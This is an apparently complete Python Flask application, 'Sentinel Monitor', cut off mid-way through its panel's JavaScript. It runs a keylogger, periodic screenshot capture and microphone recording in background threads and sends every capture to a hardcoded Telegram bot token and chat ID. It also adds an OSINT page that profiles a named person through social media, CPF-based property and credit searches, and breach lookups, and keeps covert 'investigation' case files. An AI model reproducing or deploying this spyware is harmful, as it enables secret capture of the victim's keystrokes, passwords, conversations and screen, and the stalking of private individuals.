"""
SENTINEL MONITOR - SISTEMA COMPLETO
Design Responsivo (Celular/PC) + Estilo FBI
"""

from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
from datetime import datetime, timezone, timedelta
from io import BytesIO
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas as pdf_canvas
from functools import wraps
import json, os, requests, re, threading, time
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
import numpy as np

app = Flask(__name__)
app.secret_key = "sentinel-monitor-2026"

BR_TZ = timezone(timedelta(hours=-3))

# ============================================
# CONFIGURAÇÕES
# ============================================
SISTEMA_SENHA = "spynet2026"

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
CASOS_FILE = os.path.join(DATA_DIR, "casos.json")
MONITOR_DIR = os.path.join(DATA_DIR, "monitoramento")
SCREENSHOT_DIR = os.path.join(MONITOR_DIR, "screenshots")
AUDIO_DIR = os.path.join(MONITOR_DIR, "audio")
KEYLOG_FILE = os.path.join(MONITOR_DIR, "keylog.txt")

for pasta in [DATA_DIR, MONITOR_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# ============================================
# VARIÁVEIS DO MONITORAMENTO
# ============================================
monitor_ativo = False
tempo_screenshot = 5
tempo_audio = 15
buffer_teclas = ""
ultimo_tempo = time.time()
ultimas_teclas = []

# ============================================
# FUNÇÕES DO MONITORAMENTO
# ============================================

def enviar_telegram(texto, caminho=None):
    BOT_TOKEN = "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0"
    CHAT_ID = "5672315001"
    try:
        if caminho and os.path.exists(caminho):
            with open(caminho, "rb") as f:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                requests.post(url, data={"chat_id": CHAT_ID, "caption": texto}, files={"document": f}, timeout=5)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
    except:
        pass

def processar_tecla(tecla):
    global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            caractere = tecla.char
            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?', '@', '#', '$', '-', '_']:
                buffer_teclas += caractere
                ultimo_tempo = time.time()
            elif caractere == '\r' or caractere == '\n':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        else:
            tecla_nome = str(tecla).replace('Key.', '')
            if tecla_nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif tecla_nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
            elif tecla_nome == 'backspace':
                buffer_teclas = buffer_teclas[:-1]
        
        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_teclas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_teclas.append(registro)
    if len(ultimas_teclas) > 100:
        ultimas_teclas.pop(0)
    enviar_telegram(f"⌨️ {frase}")

def capturar_screenshot():
    global monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        enviar_telegram("📸 Screenshot", caminho)
        return caminho
    except:
        return None

def capturar_audio():
    global monitor_ativo, ultimo_audio
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        fs = 44100
        duracao = 10
        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=1, dtype='float32', blocking=True)
        gravacao = np.clip(gravacao * 8.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        enviar_telegram("🎤 Áudio", caminho)
        ultimo_audio = caminho
        return caminho
    except:
        return None

def loop_captura():
    global monitor_ativo, tempo_screenshot
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    global monitor_ativo, tempo_audio
    while True:
        if monitor_ativo:
            start_time = time.time()
            capturar_audio()
            elapsed = time.time() - start_time
            wait_time = max(0, tempo_audio - elapsed)
            time.sleep(wait_time)
        else:
            time.sleep(1)

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

threading.Thread(target=iniciar_keylogger, daemon=True).start()
threading.Thread(target=loop_captura, daemon=True).start()
threading.Thread(target=loop_audio, daemon=True).start()

# ============================================
# FUNÇÕES DOS CASOS
# ============================================

def _load(path, default):
    try:
        if not os.path.exists(path): return default
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except: return default

def _save(path, obj):
    with open(path, "w", encoding="utf-8") as f: json.dump(obj, f, ensure_ascii=False, indent=2)

def load_casos(): return _load(CASOS_FILE, [])
def save_casos(c): _save(CASOS_FILE, c)

def now_br():
    return datetime.now(BR_TZ).strftime("%d/%m/%Y %H:%M")

def login_required(f):
    @wraps(f)
    def dec(*args, **kwargs):
        if not session.get("logado"): return redirect(url_for("login"))
        return f(*args, **kwargs)
    return dec

# ============================================
# FUNÇÕES OSINT
# ============================================

def buscar_redes_sociais(nome, username=None, email=None, telefone=None):
    resultados = []
    if username:
        resultados.append({"categoria": "📷 INSTAGRAM", "titulo": "Perfil", "url": f"https://www.instagram.com/{username}", "icone": "📷"})
    if nome:
        resultados.append({"categoria": "📘 FACEBOOK", "titulo": "Busca", "url": f"https://www.facebook.com/search/top?q={nome.replace(' ', '%20')}", "icone": "📘"})
        resultados.append({"categoria": "🐦 TWITTER", "titulo": "Busca", "url": f"https://twitter.com/search?q={nome.replace(' ', '%20')}", "icone": "🐦"})
        resultados.append({"categoria": "💼 LINKEDIN", "titulo": "Busca", "url": f"https://www.linkedin.com/search/results/people/?keywords={nome.replace(' ', '%20')}", "icone": "💼"})
        resultados.append({"categoria": "🎵 TIKTOK", "titulo": "Busca", "url": f"https://www.tiktok.com/search?q={nome.replace(' ', '%20')}", "icone": "🎵"})
    if email:
        resultados.append({"categoria": "📘 FACEBOOK", "titulo": "Busca por email", "url": f"https://www.facebook.com/search/top?q={email}", "icone": "📘"})
    if telefone:
        telefone_limpo = re.sub(r'\D', '', telefone)
        resultados.append({"categoria": "💬 WHATSAPP", "titulo": "Conversa", "url": f"https://wa.me/55{telefone_limpo}", "icone": "💬"})
    return resultados

def buscar_bens(cpf_cnpj):
    resultados = []
    if cpf_cnpj:
        resultados.append({"categoria": "🏠 IMÓVEIS", "titulo": "Buscar Imóveis", "url": f"https://www.google.com/search?q=registro+de+imoveis+cpf+{cpf_cnpj}", "icone": "🏠"})
        resultados.append({"categoria": "🚗 VEÍCULOS", "titulo": "Buscar Veículos", "url": f"https://www.google.com/search?q=consulta+veiculo+renavam+por+cpf+{cpf_cnpj}", "icone": "🚗"})
        if len(cpf_cnpj) == 14:
            resultados.append({"categoria": "🏢 EMPRESAS", "titulo": "Consulta CNPJ", "url": f"https://www.receitaws.com.br/v1/cnpj/{cpf_cnpj}", "icone": "🏢"})
    return resultados

def buscar_localizacao(endereco, cep=None, cidade=None):
    query = endereco if endereco else cep
    if cidade:
        query = f"{query} {cidade}"
    return {
        "maps_url": f"https://www.google.com/maps/search/{query.replace(' ', '+')}",
        "waze_url": f"https://www.waze.com/live-map/directions?to=search.{query.replace(' ', '+')}"
    }

def buscar_credito(cpf):
    resultados = []
    if cpf:
        resultados.append({"categoria": "📊 SCORE", "titulo": "Consultar Score", "url": "https://www.serasa.com.br/consulta-cpf/", "icone": "📊"})
        resultados.append({"categoria": "🚫 RESTRIÇÕES", "titulo": "Restrições", "url": "https://www.serasa.com.br/consulta-cpf/restricoes/", "icone": "🚫"})
    return resultados

def buscar_vazamentos(email):
    resultados = []
    if email:
        resultados.append({"categoria": "🔓 HAVE I BEEN PWNED", "titulo": "Verificar", "url": f"https://haveibeenpwned.com/account/{email}", "icone": "🔓"})
        resultados.append({"categoria": "🔎 LEAKCHECK", "titulo": "Verificar", "url": f"https://leakcheck.io/?q={email}", "icone": "🔎"})
    return resultados

def listar_screenshots():
    screenshots = []
    for f in sorted(os.listdir(SCREENSHOT_DIR), reverse=True):
        if f.endswith('.png'):
            screenshots.append({"nome": f, "data": datetime.fromtimestamp(os.path.getctime(os.path.join(SCREENSHOT_DIR, f))).strftime("%d/%m/%Y %H:%M:%S"), "caminho": f})
    return screenshots[:50]

def listar_audios():
    audios = []
    for f in sorted(os.listdir(AUDIO_DIR), reverse=True):
        if f.endswith('.wav'):
            audios.append({"nome": f, "data": datetime.fromtimestamp(os.path.getctime(os.path.join(AUDIO_DIR, f))).strftime("%d/%m/%Y %H:%M:%S"), "caminho": f})
    return audios[:50]

def ler_keylog():
    if os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
            return f.readlines()[-50:]
    return []

# ============================================
# ROTAS
# ============================================

@app.route("/")
def index():
    if not session.get("logado"): 
        return redirect(url_for("login"))
    return redirect(url_for("painel"))

@app.route("/login", methods=["GET", "POST"])
def login():
    erro = ""
    if request.method == "POST":
        senha = request.form.get("senha")
        if senha == SISTEMA_SENHA:
            session["logado"] = True
            return redirect(url_for("painel"))
        else:
            erro = "Senha incorreta!"
    return render_template_string(LOGIN_HTML, erro=erro)

@app.route("/logout")
def logout():
    session.pop("logado", None)
    return redirect(url_for("login"))

@app.route("/painel")
@login_required
def painel():
    casos = load_casos()
    screenshots = listar_screenshots()
    audios = listar_audios()
    keylog = ler_keylog()
    return render_template_string(PAINEL_HTML, 
        casos=list(reversed(casos)),
        screenshots=screenshots,
        audios=audios,
        keylog=keylog,
        monitor_ativo=monitor_ativo,
        total_casos=len(casos),
        total_screenshots=len(screenshots),
        total_audios=len(audios),
        total_teclas=len(keylog))

@app.route("/api/monitor/status", methods=["GET", "POST"])
@login_required
def monitor_status():
    global monitor_ativo
    if request.method == "POST":
        data = request.get_json() or {}
        monitor_ativo = data.get("ativo", monitor_ativo)
        return jsonify({"ativo": monitor_ativo})
    return jsonify({"ativo": monitor_ativo})

@app.route("/api/monitor/limpar", methods=["POST"])
@login_required
def monitor_limpar():
    global ultimas_teclas
    ultimas_teclas = []
    for f in os.listdir(SCREENSHOT_DIR):
        try: os.remove(os.path.join(SCREENSHOT_DIR, f))
        except: pass
    for f in os.listdir(AUDIO_DIR):
        try: os.remove(os.path.join(AUDIO_DIR, f))
        except: pass
    if os.path.exists(KEYLOG_FILE):
        open(KEYLOG_FILE, 'w').close()
    return jsonify({"ok": True})

@app.route("/monitor/screenshot/<nome>")
@login_required
def ver_screenshot(nome):
    caminho = os.path.join(SCREENSHOT_DIR, nome)
    if os.path.exists(caminho):
        return send_file(caminho, mimetype='image/png')
    return "", 404

@app.route("/monitor/audio/<nome>")
@login_required
def ver_audio(nome):
    caminho = os.path.join(AUDIO_DIR, nome)
    if os.path.exists(caminho):
        return send_file(caminho, mimetype='audio/wav')
    return "", 404

@app.route("/osint/redes", methods=["POST"])
@login_required
def osint_redes():
    data = request.get_json() or {}
    resultados = buscar_redes_sociais(data.get("nome",""), data.get("username",""), data.get("email",""), data.get("telefone",""))
    return jsonify({"resultados": resultados})

@app.route("/osint/bens", methods=["POST"])
@login_required
def osint_bens():
    data = request.get_json() or {}
    resultados = buscar_bens(data.get("cpf_cnpj",""))
    return jsonify({"resultados": resultados})

@app.route("/osint/localizacao", methods=["POST"])
@login_required
def osint_localizacao():
    data = request.get_json() or {}
    localizacao = buscar_localizacao(data.get("endereco",""), data.get("cep",""), data.get("cidade",""))
    return jsonify(localizacao)

@app.route("/osint/credito", methods=["POST"])
@login_required
def osint_credito():
    data = request.get_json() or {}
    resultados = buscar_credito(data.get("cpf",""))
    return jsonify({"resultados": resultados})

@app.route("/osint/vazamentos", methods=["POST"])
@login_required
def osint_vazamentos():
    data = request.get_json() or {}
    resultados = buscar_vazamentos(data.get("email",""))
    return jsonify({"resultados": resultados})

@app.route("/osint")
@login_required
def osint_page():
    return render_template_string(OSINT_HTML)

@app.route("/novo_caso", methods=["GET","POST"])
@login_required
def novo_caso():
    if request.method == "POST":
        d = request.form
        caso = {
            "id": f"SPN-{datetime.now(BR_TZ).strftime('%Y%m%d%H%M%S')}",
            "criado_em": now_br(),
            "investigador": "Sentinel",
            "status": "Em andamento",
            "tipo": d.get("tipo", ""),
            "cliente": d.get("cliente", ""),
            "investigado": d.get("investigado", ""),
            "objetivo": d.get("objetivo", ""),
            "etapas": [],
            "notas": d.get("notas", ""),
        }
        casos = load_casos()
        casos.append(caso)
        save_casos(casos)
        return redirect(url_for("caso_detalhe", caso_id=caso["id"]))
    return render_template_string(NOVO_CASO_HTML)

@app.route("/caso/<caso_id>")
@login_required
def caso_detalhe(caso_id):
    casos = load_casos()
    caso = next((c for c in casos if c["id"] == caso_id), None)
    if not caso: return redirect(url_for("painel"))
    return render_template_string(CASO_DETALHE_HTML, caso=caso)

@app.route("/api/caso/<caso_id>/etapa", methods=["POST"])
@login_required
def adicionar_etapa(caso_id):
    data = request.get_json(force=True, silent=True) or {}
    casos = load_casos()
    for c in casos:
        if c["id"] == caso_id:
            etapa = {
                "num": len(c.get("etapas", [])) + 1,
                "titulo": data.get("titulo", ""),
                "tipo": data.get("tipo", ""),
                "dados": data.get("dados", ""),
                "ts": now_br()
            }
            c.setdefault("etapas", []).append(etapa)
            break
    save_casos(casos)
    return jsonify({"ok": True})

@app.route("/api/caso/<caso_id>/status", methods=["POST"])
@login_required
def atualizar_status(caso_id):
    data = request.get_json(force=True, silent=True) or {}
    casos = load_casos()
    for c in casos:
        if c["id"] == caso_id:
            c["status"] = data.get("status", c["status"])
            break
    save_casos(casos)
    return jsonify({"ok": True})

@app.route("/api/limpar_casos", methods=["POST"])
@login_required
def limpar_casos():
    save_casos([])
    return jsonify({"ok": True})

@app.route("/relatorio/<caso_id>.pdf")
@login_required
def gerar_relatorio(caso_id):
    casos = load_casos()
    caso = next((c for c in casos if c["id"] == caso_id), None)
    if not caso: return "Caso não encontrado", 404
    buffer = BytesIO()
    c = pdf_canvas.Canvas(buffer, pagesize=A4)
    W, H = A4
    c.setFont("Helvetica-Bold", 20)
    c.drawString(50, H - 50, "RELATÓRIO DE INVESTIGAÇÃO")
    c.setFont("Helvetica", 10)
    c.drawString(50, H - 80, f"ID: {caso['id']}")
    c.drawString(50, H - 100, f"Emitido: {now_br()}")
    c.drawString(50, H - 130, f"Investigado: {caso.get('investigado', '—')}")
    c.drawString(50, H - 150, f"Cliente: {caso.get('cliente', '—')}")
    c.drawString(50, H - 170, f"Status: {caso.get('status', '—')}")
    c.drawString(50, H - 200, f"Objetivo: {caso.get('objetivo', '—')}")
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, H - 240, "ETAPAS REALIZADAS")
    y = H - 270
    c.setFont("Helvetica", 9)
    for e in caso.get("etapas", []):
        if y < 50:
            c.showPage()
            y = H - 50
        c.drawString(50, y, f"ETAPA {e['num']}: {e['titulo']} - {e['ts']}")
        y -= 15
        for linha in e.get("dados", "").split("\n"):
            if linha.strip():
                if y < 50:
                    c.showPage()
                    y = H - 50
                c.drawString(65, y, linha.strip()[:80])
                y -= 12
        y -= 8
    c.save()
    buffer.seek(0)
    return send_file(buffer, as_attachment=True, download_name=f"relatorio_{caso['id']}.pdf", mimetype="application/pdf")

# ============================================
# TEMPLATES RESPONSIVOS + ESTILO FBI
# ============================================

LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>SENTINEL - Acesso Autorizado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: radial-gradient(ellipse at 20% 30%, #0a0e1a, #03060c);
            font-family: 'Segoe UI', 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }
        
        /* Efeito de varredura */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ffcc, transparent);
            animation: scan 4s linear infinite;
            pointer-events: none;
        }
        
        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }
        
        /* Grid de fundo */
        body::after {
            content: '';
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(0deg, rgba(0, 136, 255, 0.02) 0px, rgba(0, 136, 255, 0.02) 2px, transparent 2px, transparent 8px);
            pointer-events: none;
        }
        
        .login-container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 450px;
        }
        
        .login-card {
            background: rgba(5, 10, 20, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 204, 0.4);
            border-radius: 20px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 0 40px rgba(0, 255, 204, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.05);
        }
        
        .logo {
            font-size: 64px;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 10px #00ffcc);
            animation: glow 2s ease-in-out infinite;
        }
        
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 5px #00ffcc; }
            50% { text-shadow: 0 0 20px #00ffcc; }
        }
        
        h1 {
            color: #00ffcc;
            font-size: 28px;
            letter-spacing: 6px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .subtitle {
            font-size: 11px;
            color: #8899aa;
            letter-spacing: 3px;
            margin-bottom: 35px;
            border-top: 1px solid rgba(0, 255, 204, 0.3);
            padding-top: 15px;
        }
        
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .input-group label {
            display: block;
            font-size: 11px;
            color: #00ffcc;
            letter-spacing: 2px;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 14px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(0, 255, 204, 0.3);
            border-radius: 10px;
            color: #00ffcc;
            font-family: monospace;
            font-size: 16px;
            text-align: center;
            letter-spacing: 2px;
            transition: all 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #00ffcc;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #00ffcc, #00ccff);
            border: none;
            border-radius: 10px;
            font-weight: bold;
            font-size: 16px;
            letter-spacing: 3px;
            cursor: pointer;
            transition: all 0.3s;
            color: #0a0e1a;
            margin-top: 10px;
        }
        
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px #00ffcc;
        }
        
        .error {
            color: #ff2244;
            margin-top: 15px;
            font-size: 12px;
            letter-spacing: 1px;
        }
        
        .footer {
            margin-top: 25px;
            font-size: 10px;
            color: #334455;
            letter-spacing: 1px;
        }
        
        .badge {
            position: fixed;
            bottom: 15px;
            right: 20px;
            font-size: 9px;
            color: #334455;
            font-family: monospace;
            z-index: 1;
        }
        
        @media (max-width: 480px) {
            .login-card {
                padding: 30px 20px;
            }
            .logo {
                font-size: 48px;
            }
            h1 {
                font-size: 22px;
                letter-spacing: 4px;
            }
            input, button {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="logo">🛡️</div>
            <h1>SENTINEL</h1>
            <div class="subtitle">SISTEMA DE MONITORAMENTO</div>
            
            <form method="POST">
                <div class="input-group">
                    <label>🔐 ACESSO RESTRITO</label>
                    <input type="password" name="senha" placeholder="••••••••" autofocus required>
                </div>
                <button type="submit">AUTORIZAR ACESSO</button>
                {% if erro %}<div class="error">⚠️ {{ erro }}</div>{% endif %}
            </form>
            
            <div class="footer">© SENTINEL SECURITY - ACESSO AUTORIZADO</div>
        </div>
    </div>
    <div class="badge">CLASSIFICAÇÃO: SIGILOSO</div>
</body>
</html>
'''

PAINEL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>SENTINEL - Painel de Controle</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0e1a;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #e8edf5;
            padding: 15px;
        }
        
        /* HEADER RESPONSIVO */
        .navbar {
            background: linear-gradient(90deg, #050a12, #0a0e1a);
            border-bottom: 2px solid #00ffcc;
            padding: 12px 20px;
            border-radius: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .logo {
            font-size: 20px;
            font-weight: bold;
            color: #00ffcc;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .logo span {
            font-size: 24px;
        }
        
        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 0, 0, 0.5);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
        }
        
        .led {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #0f0;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        
        .btn {
            background: transparent;
            border: 1px solid #00ffcc;
            padding: 6px 14px;
            border-radius: 20px;
            cursor: pointer;
            text-decoration: none;
            color: #00ffcc;
            font-size: 12px;
            font-weight: bold;
            transition: all 0.3s;
            display: inline-block;
            margin: 3px;
        }
        
        .btn:hover {
            background: #00ffcc;
            color: #0a0e1a;
        }
        
        .btn-start { background: #00cc66; border-color: #00cc66; color: #fff; }
        .btn-stop { background: #ff4444; border-color: #ff4444; color: #fff; }
        .btn-clear { background: #ffaa44; border-color: #ffaa44; color: #333; }
        
        /* GRID DE ESTATÍSTICAS - RESPONSIVA */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: rgba(0, 20, 40, 0.6);
            border: 1px solid rgba(0, 255, 204, 0.3);
            border-radius: 12px;
            padding: 15px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 28px;
            font-weight: bold;
            color: #00ffcc;
        }
        
        .stat-label {
            font-size: 11px;
            color: #8899aa;
            margin-top: 5px;
        }
        
        /* SEÇÕES */
        .section {
            background: rgba(0, 20, 40, 0.4);
            border: 1px solid #1a2a3a;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .section-title {
            color: #00ffcc;
            font-size: 16px;
            margin-bottom: 12px;
            border-left: 3px solid #00ffcc;
            padding-left: 10px;
        }
        
        /* SCREENSHOTS GRID */
        .screenshots-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
        }
        
        .screenshot-item {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 8px;
            text-align: center;
        }
        
        .screenshot-item img {
            width: 100%;
            border-radius: 6px;
            max-height: 120px;
            object-fit: cover;
            cursor: pointer;
        }
        
        .screenshot-date {
            font-size: 9px;
            color: #8899aa;
            margin-top: 5px;
        }
        
        /* ÁUDIOS */
        .audio-item {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 10px;
            margin-bottom: 8px;
        }
        
        audio {
            width: 100%;
            height: 36px;
        }
        
        .audio-date {
            font-size: 9px;
            color: #8899aa;
            margin-top: 5px;
        }
        
        /* KEYLOG */
        .keylog-area {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 10px;
            max-height: 250px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 11px;
        }
        
        .keylog-item {
            padding: 6px;
            border-bottom: 1px solid #1a2a3a;
            word-break: break-word;
        }
        
        /* CASOS */
        .caso-card {
            background: rgba(0, 20, 40, 0.4);
            border: 1px solid #1a2a3a;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .caso-info {
            flex: 1;
        }
        
        .caso-id {
            background: rgba(0, 136, 255, 0.3);
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 10px;
            display: inline-block;
        }
        
        .caso-nome {
            font-weight: bold;
            margin-top: 5px;
        }
        
        .caso-status {
            font-size: 10px;
            color: #ffaa44;
        }
        
        /* BOTÕES */
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }
        
        /* MODAL */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal img {
            max-width: 95%;
            max-height: 95%;
            border-radius: 10px;
        }
        
        .close {
            position: absolute;
            top: 20px;
            right: 30px;
            font-size: 40px;
            cursor: pointer;
            color: #fff;
        }
        
        /* RESPONSIVIDADE */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .navbar {
                flex-direction: column;
                text-align: center;
            }
            
            .btn-group {
                justify-content: center;
            }
            
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .screenshots-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        
        @media (max-width: 480px) {
            .stat-number {
                font-size: 22px;
            }
            
            .btn {
                padding: 5px 10px;
                font-size: 11px;
            }
            
            .section-title {
                font-size: 14px;
            }
        }
        
        ::-webkit-scrollbar {
            width: 5px;
        }
        
        ::-webkit-scrollbar-track {
            background: #1a2a3a;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #00ffcc;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">
            <span>🛡️</span> SENTINEL MONITOR
        </div>
        <div class="status-indicator">
            <div class="led"></div>
            <span id="statusText">{% if monitor_ativo %}MONITORANDO{% else %}PARADO{% endif %}</span>
        </div>
        <div class="btn-group">
            <button class="btn btn-start" onclick="iniciar()">▶️ INICIAR</button>
            <button class="btn btn-stop" onclick="parar()">⏸️ PARAR</button>
            <button class="btn btn-clear" onclick="limparDados()">🗑️ LIMPAR</button>
            <a href="/osint" class="btn">🔎 OSINT</a>
            <a href="/novo_caso" class="btn">➕ CASO</a>
            <button class="btn" onclick="limparCasos()">🗑️ CASOS</button>
            <a href="/logout" class="btn">🚪 SAIR</a>
        </div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card"><div class="stat-number">{{ total_casos }}</div><div class="stat-label">CASOS</div></div>
        <div class="stat-card"><div class="stat-number">{{ total_screenshots }}</div><div class="stat-label">SCREENSHOTS</div></div>
        <div class="stat-card"><div class="stat-number">{{ total_audios }}</div><div class="stat-label">ÁUDIOS</div></div>
        <div class="stat-card"><div class="stat-number">{{ total_teclas }}</div><div class="stat-label">TECLAS</div></div>
    </div>
    
    <div class="section">
        <div class="section-title">📸 SCREENSHOTS</div>
        <div class="screenshots-grid" id="screenshotsGrid">
            {% for s in screenshots[:8] %}
            <div class="screenshot-item">
                <img src="/monitor/screenshot/{{ s.caminho }}" onclick="abrirModal(this.src)">
                <div class="screenshot-date">{{ s.data }}</div>
            </div>
            {% else %}
            <p style="color:#8899aa; text-align:center; grid-column:span 2">Nenhuma screenshot</p>
            {% endfor %}
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">🎤 ÁUDIOS</div>
        <div id="audiosList">
            {% for a in audios[:5] %}
            <div class="audio-item">
                <audio controls src="/monitor/audio/{{ a.caminho }}"></audio>
                <div class="audio-date">{{ a.data }}</div>
            </div>
            {% else %}
            <p style="color:#8899aa; text-align:center">Nenhum áudio</p>
            {% endfor %}
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">⌨️ TECLAS DIGITADAS</div>
        <div class="keylog-area" id="keylogArea">
            {% for linha in keylog[:20] %}
            <div class="keylog-item">💬 {{ linha }}</div>
            {% else %}
            <div class="keylog-item">Nenhuma tecla capturada</div>
            {% endfor %}
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">📁 CASOS</div>
        <div id="casosList">
            {% for caso in casos %}
            <div class="caso-card">
                <div class="caso-info">
                    <span class="caso-id">{{ caso.id }}</span>
                    <div class="caso-nome">{{ caso.investigado }}</div>
                    <div class="caso-status">{{ caso.status }}</div>
                </div>
                <div>
                    <a href="/caso/{{ caso.id }}" class="btn" style="padding:4px 10px">VER</a>
                    <a href="/relatorio/{{ caso.id }}.pdf" class="btn" style="padding:4px 10px">PDF</a>
                </div>
            </div>
            {% else %}
            <p style="color:#8899aa; text-align:center">Nenhum caso registrado. <a href="/novo_caso" style="color:#00ffcc">Criar primeiro caso →</a></p>
            {% endfor %}
        </div>
    </div>
    
    <div id="modal" class="modal" onclick="fecharModal()">
        <span class="close">&times;</span>
        <img id="modalImg">
    </div>
    
    <script>
        function abrirModal(src) {
            document.getElementById('modalImg').src = src;
            document.getElementById('modal').style.display = 'flex';
        }
        
        function fecharModal() {
            document.getElementById('modal').style.display = 'none';
        }
        
        function atualizarStatus() {
            fetch('/api/monitor/status')
                .then(r => r.json())
                .then(d => {
                    document.getElementById('statusText').innerText = d.ativo ? "MONITORANDO" : "PARADO";
                });
        }
        
        function iniciar() {
            fetch('/api/monitor/status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ativo: true })
            }).then(() => {
                atualizarStatus();
                setTimeout(() => location.reload(), 1500);
            });
        }
        
        function parar() {
